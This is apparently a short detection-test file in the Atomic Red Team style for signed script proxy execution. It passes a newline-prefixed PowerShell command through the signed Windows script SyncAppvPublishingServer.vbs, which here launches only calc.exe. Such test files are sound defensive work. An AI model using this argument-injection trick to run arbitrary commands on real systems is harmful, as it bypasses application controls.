@@ -1,0 +1,8 @@
+#TechniqueName: Signed Script Proxy Execution
+#AtomicTestName: SyncAppvPublishingServer Signed Script PowerShell Command Execution
+#Description: Executes the signed SyncAppvPublishingServer script with options to execute an arbitrary PowerShell command.&Upon execution, calc.exe will be launched.&
+#Language: cmd
+
+#commands
+C:\windows\system32\SyncAppvPublishingServer.vbs "\n;Start-Process calc"
+
